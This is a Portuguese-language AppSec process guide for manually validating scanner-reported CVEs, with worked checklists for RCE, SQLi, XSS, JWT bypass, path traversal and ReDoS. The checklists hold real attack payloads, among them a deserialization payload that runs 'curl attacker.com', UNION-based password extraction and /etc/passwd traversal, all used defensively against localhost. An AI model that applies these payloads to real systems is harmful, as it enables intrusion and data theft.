---
id: validacao-manual-cves
title: Validação Manual de CVEs — Evidência Empírica vs. Plausibilidade
description: Garantir que vulnerabilidades reportadas por SCA são validadas tecnicamente antes de mitigação
tags: [addon, validacao-manual, i2, cve, sca, false-positives, exploitability]
---

# 🔬 Validação Manual de CVEs — Evidência Empírica vs. Plausibilidade

## 🎯 Objetivo

Este addon estabelece o **Invariante I2 (Evidência acima de Plausibilidade)** no contexto de gestão de vulnerabilidades, garantindo que:

- **CVEs não são aceites apenas porque "scanner reportou"** — Requerem validação técnica de exploitabilidade
- **Testes empíricos obrigatórios** para CVEs CRÍTICOS em L2/L3
- **Falsos positivos (FP) e Falsos Negativos (FN) são detectados e registados**
- **Prioridade baseada em risco real** (EPSS, exploit público, contexto aplicação) vs. severidade CVSS

**Contexto normativo:**  
Este addon implementa o **Invariante I2 (Evidência acima de Plausibilidade)** de [agent.md](https://github.com/your-org/agent-spec). Complementa [addon-02](./02-analise-sca) (SCA automático) e [addon-09](./09-excecoes-e-aceitacao-risco) (gestão exceções).

---

## 🚨 Cenários de Risco — Quando I2 é Violado

### Cenário 1: CVE "Plausível" Mas Não Exploitável no Contexto

**Exemplo crítico:**
```yaml
# SCA tool reporta: CVE-2023-12345 (CRITICAL — Remote Code Execution)
# Afeta: library X v1.2.3, usado em aplicação L3
# Descrição CVE: "Deserialization of untrusted data in REST API"
# Decisão: "CRITICAL RCE, update imediato (breaking changes)"

# Realidade após análise técnica:
# 1. Código da aplicação não usa REST API da library (apenas SDK local)
# 2. Input deserializado vem de config.yaml interno (não user input)
# 3. CVE NÃO É EXPLOITÁVEL no nosso contexto

# Resultado: Falso Positivo — Breaking changes desnecessários
```

**Risco:**
- Migration complexa evitável (3 sprints)
- Instabilidade introduzida sem ganho de segurança
- Recursos desperdiçados

---

### Cenário 2: CVE Exploitável Mas Scanner Não Detecta (Falso Negativo)

**Exemplo crítico:**
```yaml
# CVE-2024-99999: SQL Injection in ORM library v2.1.0
# Scanner SCA: ❌ Não reporta (versão 2.1.0 não está na vulnerability DB ainda)
# NIST NVD: Publicado há 24h, ainda não propagado para GitHub Advisory

# Realidade:
# - Exploit PoC público disponível
# - Aplicação L3 usa ORM v2.1.0 com user input em queries
# - Vulnerável a SQLi CRITICAL

# Resultado: Falso Negativo — Vulnerabilidade ativa não detectada
```

**Risco:**
- Exposição ativa a SQLi CRITICAL
- Potencial exfiltração de dados
- SLA CVE CRITICAL não respeitado (não detectado)

---

### Cenário 3: CVE com Severidade Inflacionada (CVSS vs. Contexto Real)

**Exemplo crítico:**
```yaml
# CVE-2023-88888: Path Traversal (CVSS 9.8 CRITICAL)
# Descrição: "Arbitrary file read via ../ in filename parameter"
# Scanner: CRITICAL — bloqueia release

# Análise técnica:
# 1. Endpoint afetado: GET /download/:filename
# 2. Aplicação: filename validado com whitelist (apenas [a-zA-Z0-9_-].pdf)
# 3. Path traversal NÃO É POSSÍVEL (input sanitizado)
# 4. CVE reporta biblioteca standalone, não considera uso seguro

# Risco real: BAIXO (mitigado por validação input)
# CVSS: 9.8 (sem contexto aplicação)
# Decisão correta: VEX "not_affected" — validação input mitiga
```

**Risco de não validar:**
- Block release desnecessário
- Urgência falsa vs. vulnerabilidades reais
- Priorização inadequada

---

## 🔐 Procedimento de Validação Manual — Framework I2

### Fase 1: Categorizar CVE por Tipo de Vulnerabilidade

**Entrada:** CVE reportado por SCA tool (Snyk, Dependabot, OWASP Dependency-Check)

**Taxonomia de vulnerabilidades (6 categorias):**

| Categoria | Tipo CVE | Teste Empírico | Ferramentas |
|---|---|---|---|
| **A: Remote Code Execution (RCE)** | Deserialization, injection, eval | Exploit PoC, payload crafting | Burp Suite, curl, Python exploit |
| **B: SQL Injection (SQLi)** | ORM bypass, query injection | SQL payloads, union/blind tests | sqlmap, manual payloads |
| **C: Cross-Site Scripting (XSS)** | Reflected, stored, DOM-based | XSS payloads, CSP bypass | XSStrike, Burp Suite |
| **D: Authentication Bypass** | JWT manipulation, session fixation | Token tampering, replay attacks | jwt_tool, Burp Suite |
| **E: Path Traversal / LFI** | Directory traversal, file inclusion | ../ payloads, file read attempts | Manual testing, dotdotpwn |
| **F: Denial of Service (DoS)** | ReDoS, resource exhaustion, crash | Load testing, malformed input | Apache Bench, custom scripts |

---

### Fase 2: Teste Empírico por Categoria

**Papéis:** AppSec Engineer (executor), Developer (contexto), Arquiteto (validação impacto)

:::userstory
**História.**  
Como **AppSec Engineer**, quero validar empiricamente CVE reportado por SCA com teste técnico, para confirmar exploitabilidade antes de priorizar mitigação.

**Critérios de aceitação (BDD).**
- **Dado** que CVE foi reportado por scanner  
  **Quando** executo teste empírico por categoria  
  **Então** confirmo ou refuto exploitabilidade, registo FP/FN, e priorizo mitigação

**Checklist I2 — Validação Empírica por Categoria.**

#### **A. Remote Code Execution (RCE)**

```yaml
CVE: CVE-2023-12345
Descrição: "Deserialization of untrusted data in library X"
Severidade CVSS: 9.8 (CRITICAL)
Biblioteca afetada: jackson-databind 2.13.0

Validação empírica:
  - [ ] Código usa deserialization?
    Comando: grep -r "ObjectMapper.readValue" src/
    Resultado: SIM — 5 ocorrências encontradas
    
  - [ ] Input vem de user?
    Análise: 3/5 ocorrências processam HTTP request body (user input) ❌
               2/5 processam config.yaml interno (safe) ✅
    Resultado: 3 ocorrências VULNERÁVEIS
    
  - [ ] Exploit PoC funciona?
    Comando: curl -X POST http://localhost:8080/api/process \
             -H "Content-Type: application/json" \
             -d '{"@class":"java.lang.ProcessBuilder","command":["curl","attacker.com"]}'
    Resultado: ✅ RCE confirmado — DNS lookup para attacker.com detectado
    
  - [ ] Mitigação existente?
    Verificação: Spring Security config, input validation
    Resultado: ❌ Nenhuma mitigação — deserialization sem whitelist

Conclusão: VULNERÁVEL (RCE CRITICAL confirmado)
Prioridade: CRÍTICA — SLA 48h (L3)
Ação: Update jackson-databind 2.13.0 → 2.14.1 (patch disponível)
```

#### **B. SQL Injection (SQLi)**

```yaml
CVE: CVE-2024-11111
Descrição: "SQL injection in Hibernate ORM"
Severidade CVSS: 8.6 (HIGH)
Biblioteca afetada: hibernate-core 5.6.0

Validação empírica:
  - [ ] Código usa queries dinâmicas?
    Comando: grep -r "createQuery\|createNativeQuery" src/
    Resultado: SIM — 12 ocorrências
    
  - [ ] Queries com concatenação?
    Análise: 
      - 10/12 usam named parameters (:param) — SAFE ✅
      - 2/12 usam concatenação direta — VULNERABLE ❌
    Exemplo vulnerável:
      String query = "SELECT * FROM users WHERE name = '" + userName + "'";
      session.createNativeQuery(query).list();
    
  - [ ] Exploit SQLi funciona?
    Payload: userName = "' OR '1'='1"
    Comando: curl "http://localhost:8080/api/users?name=%27+OR+%271%27%3D%271"
    Resultado: ✅ SQLi confirmado — retorna todos os users
    
  - [ ] Exfiltração possível?
    Payload: userName = "' UNION SELECT password FROM users--"
    Resultado: ✅ Exfiltração confirmada — passwords vazados

Conclusão: VULNERÁVEL (SQLi HIGH confirmado)
Prioridade: ALTA — SLA 7d (L2)
Ação: 
  1. Hotfix imediato: Trocar concatenação por named parameters
  2. Update hibernate 5.6.0 → 6.2.0 (long-term)
```

#### **C. Cross-Site Scripting (XSS)**

```yaml
CVE: CVE-2023-77777
Descrição: "Reflected XSS in template engine"
Severidade CVSS: 6.5 (MEDIUM)
Biblioteca afetada: thymeleaf 3.0.11

Validação empírica:
  - [ ] Template engine escapa output?
    Verificação: Templates usam [[${variable}]] (escaped) ou [(${variable})] (unescaped)?
    Resultado: 
      - 90% templates usam [[...]] — SAFE ✅
      - 10% templates usam [(...)] — POTENTIALLY VULNERABLE ⚠️
    
  - [ ] User input renderizado sem escape?
    Análise: 
      Endpoint: GET /search?query=<user_input>
      Template: <h1>Results for: [(${query})]</h1> — UNESCAPED ❌
    
  - [ ] Exploit XSS funciona?
    Payload: query=<script>alert(document.cookie)</script>
    Comando: curl "http://localhost:8080/search?query=%3Cscript%3Ealert(1)%3C/script%3E"
    Resultado: ✅ XSS confirmado — script executado no browser
    
  - [ ] CSP mitiga?
    Verificação: Response headers
    Resultado: ❌ Content-Security-Policy não configurado

Conclusão: VULNERÁVEL (XSS MEDIUM confirmado)
Prioridade: MÉDIA — SLA 30d (L1)
Ação: 
  1. Trocar [(...)] por [[...]] em template (1h fix)
  2. Adicionar CSP header (defense-in-depth)
```

#### **D. Authentication Bypass**

```yaml
CVE: CVE-2024-55555
Descrição: "JWT signature bypass in library Y"
Severidade CVSS: 9.1 (CRITICAL)
Biblioteca afetada: jsonwebtoken 8.5.0

Validação empírica:
  - [ ] JWT validation implementado?
    Código: jwt.verify(token, secret, {algorithms: ['HS256']})
    Resultado: SIM — validation existe
    
  - [ ] Algoritmo "none" aceite?
    Teste: Criar JWT com "alg": "none", remover signature
    Comando: 
      Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
      curl -H "Authorization: Bearer <token_none>" http://localhost:8080/admin
    Resultado: ❌ 401 Unauthorized — algoritmo "none" rejeitado ✅
    
  - [ ] Key confusion attack funciona?
    Teste: Trocar HS256 (symmetric) por RS256 (asymmetric) usando public key como secret
    Resultado: ❌ Algoritmo fixo em código (não aceita RS256) ✅
    
  - [ ] Weak secret?
    Verificação: Secret é "secret123" ou strong key?
    Resultado: ✅ Secret de 256 bits gerado por crypto.randomBytes

Conclusão: NÃO VULNERÁVEL (mitigações implementadas)
Prioridade: BAIXA — VEX "not_affected"
Ação: Registar VEX document (CVE não aplicável ao nosso contexto)
```

#### **E. Path Traversal / Local File Inclusion**

```yaml
CVE: CVE-2023-66666
Descrição: "Directory traversal in file download endpoint"
Severidade CVSS: 7.5 (HIGH)
Biblioteca afetada: express-fileupload 1.3.0

Validação empírica:
  - [ ] Endpoint aceita filename de user?
    Código: 
      app.get('/download/:filename', (req, res) => {
        const file = path.join(__dirname, 'uploads', req.params.filename);
        res.sendFile(file);
      });
    Resultado: SIM — user controla filename
    
  - [ ] Path traversal possível?
    Payload: filename=../../../etc/passwd
    Comando: curl "http://localhost:8080/download/..%2F..%2F..%2Fetc%2Fpasswd"
    Resultado: ✅ Path traversal confirmado — /etc/passwd retornado ❌
    
  - [ ] Validação de filename existe?
    Verificação: Whitelist, blacklist, sanitization?
    Resultado: ❌ Nenhuma validação — aceita qualquer filename
    
  - [ ] Arquivos críticos acessíveis?
    Teste: Ler config.yaml, .env, database.sqlite
    Resultado: ✅ Todos arquivos legíveis — CRITICAL ❌

Conclusão: VULNERÁVEL (Path Traversal HIGH confirmado)
Prioridade: ALTA — SLA 7d (L2)
Ação: 
  1. Adicionar whitelist: /^[a-zA-Z0-9_-]+\.(pdf|jpg|png)$/
  2. Usar basename() para remover path
  3. Update library para 1.4.0 (patch)
```

#### **F. Denial of Service (DoS)**

```yaml
CVE: CVE-2024-33333
Descrição: "ReDoS (Regular Expression DoS) in validator"
Severidade CVSS: 7.5 (HIGH)
Biblioteca afetada: validator.js 13.7.0

Validação empírica:
  - [ ] Regex vulnerável em uso?
    Código: validator.isEmail(userInput)
    Análise: Biblioteca usa regex complexo para email validation
    Resultado: SIM — regex vulnerável a ReDoS
    
  - [ ] Input user-controlled?
    Endpoint: POST /register {email: "<user_input>"}
    Resultado: SIM — user controla input
    
  - [ ] Exploit DoS funciona?
    Payload: email = "a" * 50000 + "@"
    Comando: 
      time curl -X POST http://localhost:8080/register \
           -d '{"email":"aaaa...aaaa@"}' (50k 'a's)
    Resultado: ✅ DoS confirmado — resposta em 45 segundos (timeout)
    
  - [ ] Impacto produção?
    Análise: Endpoint público? Rate limiting?
    Resultado: 
      - Endpoint público (sem auth) ❌
      - Rate limiting: 100 req/min (insuficiente) ⚠️
      - 3 atacantes conseguem saturar (300 req/min, cada req = 45s)

Conclusão: VULNERÁVEL (ReDoS HIGH confirmado)
Prioridade: ALTA — SLA 7d (L2)
Ação:
  1. Adicionar rate limiting agressivo: 5 req/min por IP
  2. Timeout de 2s para regex validation
  3. Update validator.js 13.7.0 → 13.9.0 (patch)
```

:::

---

### Fase 3: Registar Resultado — Exploitável ou Falso Positivo/Negativo

**Artefato:** `dependencies/validation-results/CVE-2023-12345-validation.md`

```yaml
---
cve_id: CVE-2023-12345
titulo: "Deserialization RCE in jackson-databind"
biblioteca: jackson-databind 2.13.0
severidade_cvss: 9.8 (CRITICAL)
data_teste: "2026-01-16"
executor_teste: "Maria AppSec Engineer"
validador: "João Arquiteto"

# Resultado
resultado: "EXPLOITÁVEL" # [EXPLOITÁVEL | NÃO_APLICÁVEL | MITIGADO]
evidencia: |
  **Teste RCE:**
  1. Identifiquei 5 ocorrências de ObjectMapper.readValue() no código
  2. 3/5 ocorrências processam user input (HTTP body)
  3. Exploit PoC executado com sucesso:
     curl -X POST http://localhost:8080/api/process \
          -d '{"@class":"java.lang.ProcessBuilder","command":["curl","attacker.com"]}'
     Resultado: DNS lookup para attacker.com detectado (RCE confirmado) ✅
  4. Nenhuma mitigação existente (sem whitelist de classes)
  
  **EPSS Score:** 0.89 (89% probabilidade exploração nos próximos 30 dias)
  **Exploit público:** SIM — GitHub PoC disponível desde 2023-12-01
  
# Decisão pós-validação
decisao_final: "MITIGAÇÃO URGENTE"
prioridade: "CRÍTICA" # baseada em exploitabilidade real, não apenas CVSS
risco_residual: "CRÍTICO" # até update aplicado
acao: |
  1. **Hotfix imediato (4h):**
     - Adicionar whitelist de classes deserializáveis (apenas DTOs safe)
     - Deploy emergencial em prod
  
  2. **Patch permanente (24h):**
     - Update jackson-databind 2.13.0 → 2.14.1
     - Validação em staging
     - Deploy prod com canary
  
  3. **Verificação pós-patch:**
     - Re-executar PoC (deve falhar)
     - Scan com SCA tool (CVE deve desaparecer)

# KPI
severidade_original_cvss: 9.8 (CRITICAL)
severidade_contextual: 9.8 (CRITICAL) # igual porque é realmente exploitável
tempo_validacao_horas: 3
metodo_validacao: "Exploit PoC + code analysis + EPSS"
sla: 48h (L3 CRITICAL)

---
```

**Se fosse Falso Positivo:**
```yaml
resultado: "NÃO_APLICÁVEL"
evidencia: |
  **Análise de contexto:**
  1. CVE reporta RCE via deserialization
  2. Código usa jackson-databind mas apenas deserializa config.yaml (interno)
  3. Nenhum user input é deserializado
  4. Exploit PoC testado: Falhou (input não chega à library vulnerável)
  
  **Conclusão:** CVE não é exploitável no nosso contexto
  
decisao_final: "VEX not_affected"
prioridade: "BAIXA"
acao: |
  - Criar VEX document justificando "not_affected"
  - Não bloquear release
  - Revisão: 6 meses (reavaliar se uso da lib muda)
```

---

### Fase 4: Gestão de Falsos Positivos e Falsos Negativos

#### **Falsos Positivos (FP) — CVE reportado mas não exploitável**

**Procedimento:**
1. **Análise técnica** — Documentar por que não é exploitável (contexto aplicação)
2. **VEX document** — Criar Vulnerability Exploitability eXchange
3. **Suppressão temporária** — Marcar CVE como "not_affected" em SCA tool
4. **Revisão periódica** — 6 meses, reavaliar se uso da lib mudou

**Template VEX:**
```json
{
  "cve_id": "CVE-2023-88888",
  "status": "not_affected",
  "justification": "vulnerable_code_not_in_execute_path",
  "analysis": "Path traversal CVE requires user-controlled filename. Our application validates filename with whitelist [a-zA-Z0-9_-].pdf, making traversal impossible.",
  "validated_by": "maria.appsec@example.com",
  "date": "2026-01-16",
  "review_date": "2026-07-16"
}
```

#### **Falsos Negativos (FN) — CVE não detectado por scanner**

**Procedimento:**
1. **Discovery** — Como foi descoberto? (Manual testing, incident, threat intel)
2. **Root cause** — Por que scanner não detectou? (DB outdated, version not tracked)
3. **Ação imediata** — Mitigar vulnerabilidade (patch/workaround)
4. **Melhoria de processo** — Atualizar scanner, adicionar custom checks

**Template FN:**
```markdown
# Falso Negativo — FN-2026-003

## Descrição
CVE-2024-99999: SQL Injection in hibernate-core 5.6.0
Scanner: OWASP Dependency-Check não reportou

## Como foi descoberto
- Penetration test manual em 2026-01-20
- Tester identificou SQLi em endpoint /api/users?name=X
- CVE publicado há 48h mas não propagado para NVD ainda

## Root cause
- GitHub Advisory Database não atualizou ainda
- OWASP Dependency-Check usa NVD como fonte (delay de 24-72h)
- Versão hibernate 5.6.0 não marcada como vulnerável no momento do scan

## Ação imediata
- Hotfix aplicado: Named parameters em queries vulneráveis (2h)
- Deploy emergencial prod (2026-01-20 16:00)
- Verificação: SQLi não mais possível ✅

## Melhoria de processo
- Adicionar segunda fonte de CVEs: Snyk (mais rápido que NVD)
- Daily scan vs. weekly scan
- Subscribe GitHub Security Advisories para libs críticas
- Custom check para padrões inseguros (string concatenation em SQL)

## Validação contínua
- Adicionar teste de segurança: SQLi payloads em CI/CD
- Regression test: Tentativa SQLi deve retornar 400 Bad Request
- Próxima revisão: 2026-04-20 (validar se FN foi coberto)
```

---

## 📊 KPIs de Validação Manual — Qualidade de CVEs

| KPI | Fórmula | Meta | Ação |
|---|---|---|---|
| **FP Rate** | (FP confirmados / Total CVEs) × 100 | <20% | Se >30%: Scanner mal configurado |
| **FN Rate** | (FN descobertos / Total CVEs críticos) × 100 | <3% | Se >10%: Scanner inadequado |
| **Tempo validação** | Horas entre CVE reportado e validação empírica | <24h (CRITICAL) | Se >48h: Gargalo de processo |
| **% CVEs CRITICAL testados** | (CVEs testados / Total CVEs CRITICAL) × 100 | 100% (L2/L3) | Se <80%: Compliance issue |
| **EPSS correlation** | % CVEs com EPSS >0.5 priorizados | >90% | Se <70%: Priorização inadequada |

**Decision thresholds:**
- **FP rate >30%** → Scanner agressivo, muitos alertas falsos
- **FN rate >10%** → Scanner desatualizado ou fonte inadequada
- **Validação <24h CRITICAL** → SLA não cumprido

---

## 📐 Proporcionalidade por Nível

| Aspecto | L1 | L2 | L3 |
|---|---|---|---|
| **Validação empírica obrigatória?** | Recomendado (CRITICAL) | Obrigatório (CRITICAL, HIGH) | Obrigatório (todas CVEs MEDIUM+) |
| **Métodos de teste** | Manual analysis | Manual + exploit PoC | Manual + PoC + automated regression |
| **Cobertura de CVE** | ≥50% CRITICAL | 100% CRITICAL, ≥70% HIGH | 100% MEDIUM+ |
| **FP rate aceitável** | <30% | <20% | <15% |
| **FN rate aceitável** | <10% | <5% | <3% |
| **Tempo validação** | <7 dias | <24 horas (CRITICAL) | <24 horas (CRITICAL/HIGH) |
| **EPSS prioritization** | Opcional | Recomendado | Obrigatório |

---

## ✅ Checklist de Implementação

- [ ] Taxonomia de CVEs (6 categorias) comunicada a equipa AppSec
- [ ] Ferramentas de teste disponíveis (Burp Suite, sqlmap, curl, jwt_tool)
- [ ] Templates de validação criados por categoria (A-F)
- [ ] VEX integration configurada (suppressão FP com justificação)
- [ ] Dashboard KPIs configurado (FP rate, FN rate, tempo validação)
- [ ] EPSS scoring integrado (priorização baseada em exploitabilidade)
- [ ] Processo FN discovery documentado (como reportar, RCA, fix tracking)
- [ ] Training: AppSec Engineers sabem testar cada categoria CVE
- [ ] Regression tests: CVEs críticos adicionados a CI/CD
- [ ] SLA validação definido (CRITICAL 24h, HIGH 7d, MEDIUM 30d)

---

**Última atualização**: 2026-01-01  
**Versão do addon**: 1.0.0  
**Autores**: AppSec Engineers + Penetration Testers + Security Researchers  
**Aprovação**: [Nome do AppSec Lead/CISO] — [Data]
